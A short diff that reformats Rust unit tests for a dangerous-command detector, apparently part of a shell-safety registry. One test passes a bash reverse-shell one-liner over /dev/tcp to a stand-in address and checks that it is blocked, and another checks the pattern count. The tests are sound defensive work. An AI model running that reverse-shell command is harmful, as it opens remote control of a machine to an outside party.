@@ -674,7 +674,10 @@ mod tests {
     #[test]
     fn dev_tcp_shell_is_blocked() {
         let r = DangerousPatternRegistry::new();
-        assert!(r.check("/bin/bash -i >& /dev/tcp/10.0.0.1/4444 2>&1").is_some());
+        assert!(
+            r.check("/bin/bash -i >& /dev/tcp/10.0.0.1/4444 2>&1")
+                .is_some()
+        );
     }
 
     #[test]
@@ -745,6 +748,10 @@ mod tests {
     #[test]
     fn pattern_count_exceeds_26() {
         let r = DangerousPatternRegistry::new();
-        assert!(r.pattern_count() >= 26, "expected >= 26 patterns, got {}", r.pattern_count());
+        assert!(
+            r.pattern_count() >= 26,
+            "expected >= 26 patterns, got {}",
+            r.pattern_count()
+        );
     }
 }
